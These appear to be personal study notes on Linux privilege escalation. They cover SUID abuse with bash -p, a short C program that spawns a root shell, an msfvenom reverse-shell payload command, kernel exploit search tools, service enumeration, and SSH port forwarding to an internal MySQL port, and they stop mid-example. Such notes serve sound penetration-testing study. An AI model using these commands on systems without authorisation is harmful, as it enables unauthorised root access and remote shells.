##### special permissions
setuid SUID bit: when set, files get executed with the privileges of the file owner
setgid SGID bit: when this is set on a file, the file will get executed with the privileges of the file group
when set on a directory files created within that directory will inherit the group of the directory itself
effective id: used by most processes to verify a user, real id is only typically used in /etc/passwd (use command "id" for examples, 
```
cat /prox/$$/status | grep "[UG]id" for processes)
```

##### can run executables as root
if SUID is set for /bin/(ba)sh can copy file, rename, and execute with -p

##### custom executable
if a root process executes another process which you can control you can augment process to spawn root shell
example in C:
```
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
and compile using gcc -o NAME FILENAME.C
msfvenom can also be used to spawn rev shell
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= =f elf shell.elf
```

# tools
linux smart enumeration (lse.sh): bash script

# kernel
usually a last resort as they can be unstable or crash machine 
search kernel with uname -a
searchsploit with kernel version
```
# searchsploit linux kernel 2.6.32 priv esc
```
or better yet, linux exploit suggester
```
# ./linux_exploit_suggester2 -k 2.6.32
```

# service exploits
#### enumerate service
- if vulnterable services are running as root explioiting could lead to priv esc
`$ ps aux | grep "^root"`
- enumerate versions of any programs found
`$<program> --version (-v)`
debian:
`$ dpkg -l | grep <program>`
rpm package manager (redhat):
`$ rpm -qa | grep <program>`

# port forwarding
- possible for root process to be bound to an internal port
- if you cannot exploit locall on target machine it may be possible to forward using ssh to localhost
` $ ssh -R <LOCAL_PORT>:127.0.0.1:<SERVICE_PORT> <USERNAME>@<LOCAL_MACHINE>`

###### example with mysql
on target:
`$ netstat -nl`
`tcp  0  0  127.0.0.1:3306  0.0.0.0:*  LISTEN`
`$ ssh -R 9001:127.0.0.1:3306 dials@192.168.0.129`
on local:


